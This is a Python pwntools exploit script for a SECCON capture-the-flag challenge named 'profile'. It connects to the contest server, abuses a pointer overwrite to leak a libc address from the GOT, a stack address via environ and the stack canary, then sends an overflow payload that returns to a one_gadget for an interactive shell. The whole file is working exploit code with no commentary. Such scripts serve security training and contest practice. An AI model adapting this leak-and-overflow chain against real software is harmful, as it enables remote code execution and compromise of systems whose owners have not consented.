from pwn import *

#r = process("./profile")
r = remote("profile.pwn.seccon.jp",28553)
break_cmd = """
b *0x00000000004011A6
b *0x000000000040110F
"""
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
libc = ELF("./libc.so.6",checksec=False)

#gdb.attach(r,break_cmd)

def init(name,age,msg):
    r.sendlineafter("Name >> ",name)
    r.sendlineafter("Age >> ",age)
    r.sendlineafter("Message >> ",msg)

def updatemsg(msg):
    r.sendlineafter(">> ","1")
    r.sendlineafter("Input new message >> ",msg)

def leak():
    r.sendlineafter(">> ","2")
    r.recvuntil("Name : ")
    return r.recvline()[:8]

def main():
    init("a" * 400,"1" * 8,"b" * 10)

    setbuf_got = 0x000000602068
    updatemsg("a" * 16 + p64(setbuf_got))

    setbuf_libc = u64(leak())
    libc_base = setbuf_libc - libc.symbols['setbuf']
    one_gadget = libc_base + 0xf1147
    p_environ = libc_base + libc.symbols['environ']

    print(hex(libc_base))
    print(hex(p_environ))

    updatemsg("a" * 16 + p64(p_environ))
    stack_addr = u64(leak())
    print(hex(stack_addr))
    canary_addr = stack_addr - 272
    print(hex(canary_addr))

    updatemsg("b" * 16 + p64(canary_addr))

    canary = u64(leak())
    print(hex(canary))

    # pwn
    p = ""
    p += "a" * 16
    p += p64(0)
    p += p64(0x190) * 2
    p += p64(0)
    p += "a" * 8
    p += p64(canary)
    p += "c" * 24
    p += p64(one_gadget)

    updatemsg(p)

    r.sendline("0")

    r.interactive()


if __name__ == "__main__":
    main()
